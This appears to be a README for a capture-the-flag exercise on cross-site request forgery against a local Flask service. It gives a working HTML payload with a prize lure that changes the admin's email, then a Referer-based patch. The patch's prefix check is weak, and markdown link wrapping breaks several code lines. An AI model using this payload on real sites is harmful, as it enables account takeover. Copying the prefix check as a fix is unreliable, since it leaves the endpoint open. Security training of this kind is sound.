# CSRF Account Takeover - Hack & Shield A&D Challenge

## Service Description
This service is a simulated user dashboard that allows authenticated users to update their profile settings. 

**The Vulnerability:** The application contains a **Cross-Site Request Forgery (CSRF)** vulnerability on the `/update_email` endpoint. While it correctly requires an active session cookie, it fails to verify the *origin* of the request (missing CSRF tokens and Referer checks). An attacker can craft a malicious webpage that forces an authenticated administrator's browser to silently change the admin's email address to the attacker's email address.

## What to Expect (Service Flow)
When the service is running, it exposes the following endpoints:
* `GET /` - The landing page and login portal.
* `POST /login` - Authentication endpoint.
* `GET /dashboard` - Displays the logged-in user's current email.
* `POST /update_email` - The vulnerable state-changing endpoint.
* `GET /retrieve_flag` - A public endpoint that dispenses the flag if the requested email matches the admin's current email in the database.

**Known Accounts:**
* Target Victim (Admin): `admin` / `password123`

## Local Setup & Deployment
Run these commands from the project directory to start the target server:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python app.py
```
*The service will start listening on `http://127.0.0.1:5000`.*

---

## Attack Phase (Red Team)
Your goal as an attacker is to trick an administrator into executing a request that changes their account email to yours. Once changed, you can claim the flag using your injected email.

### Step 1: Weaponize the Payload
Create an HTML file on your local machine named `malicious.html`. Add the following code, which contains a form targeting the vulnerable endpoint with your attacker email (`hacker@evil-domain.com`):

```html
<!DOCTYPE html>
<html>
<body>
    <h2>You won a free gift card!</h2>
    <form id="csrf-form" action="[http://127.0.0.1:5000/update_email](http://127.0.0.1:5000/update_email)" method="POST">
        <input type="hidden" name="email" value="hacker@evil-domain.com">
        <input type="submit" value="Claim Prize Now!">
    </form>
</body>
</html>
```

### Step 2: Trigger the Exploit (Simulate the Victim)
1. In your web browser, navigate to `http://127.0.0.1:5000` and log in as the victim (`admin` / `password123`). The browser now holds the active admin session.
2. Open a **new tab** in the exact same browser window.
3. Press `Ctrl+O` (File -> Open) and open your `malicious.html` file.
4. Click the "Claim Prize Now!" button. Because the form submits to the vulnerable app while the admin session is still active, the browser automatically attaches the cookie, and the server blindly accepts the email update.

### Step 3: Capture the Flag
Now that you have successfully hijacked the admin's email, use the public flag exfiltration endpoint to prove it. You do not need to be logged in for this.

Open your terminal and run:
```bash
curl -s "[http://127.0.0.1:5000/retrieve_flag?email=hacker@evil-domain.com](http://127.0.0.1:5000/retrieve_flag?email=hacker@evil-domain.com)"
```
**Expected Output:** `{"flag":"HNS{csrf_account_takeover_success}","message":"Account ownership verified via email."}`

---

## Defense Phase (Blue Team)
Your goal as a defender is to stop external websites from forcing state-changing requests, while ensuring legitimate users can still update their emails from the official dashboard.

### Step 1: Locate the Vulnerability
Open `app.py` and inspect the `update_email()` function. Notice that it checks if the user is logged in, but lacks any validation to confirm the request actually originated from `http://127.0.0.1:5000`.

### Step 2: Apply the Patch
Add a strict HTTP `Referer` check to ensure the form was submitted from your own domain. 

**Vulnerable Code:**
```python
@app.route('/update_email', methods=['POST'])
def update_email():
    if 'username' not in session:
        return "Unauthorized: Please log in first.", 401
        
    new_email = request.form.get('email')
```

**Patched Code:**
```python
@app.route('/update_email', methods=['POST'])
def update_email():
    if 'username' not in session:
        return "Unauthorized: Please log in first.", 401
        
    referer = request.headers.get("Referer", "")
    if not referer.startswith("[http://127.0.0.1:5000](http://127.0.0.1:5000)"):
        return "CSRF attempt detected! Invalid referer.", 403
        
    new_email = request.form.get('email')
```

### Step 3: Verify the Fix
Restart the Flask server.
1. **Check the Exploit:** Log in as the admin, open `malicious.html` in a new tab, and click the button. You will now be blocked with the message: `CSRF attempt detected! Invalid referer.`
2. **Verify Flag Security:** If you run the attacker `curl` command for the flag, it will return `{"error": "Email does not match the admin account."}` because the CSRF attack failed.
3. **Check the SLA (Service Level Agreement):** Go to the actual dashboard at `http://127.0.0.1:5000/dashboard`, type a new email into the form, and submit it. It will succeed because the request originated from the correct domain.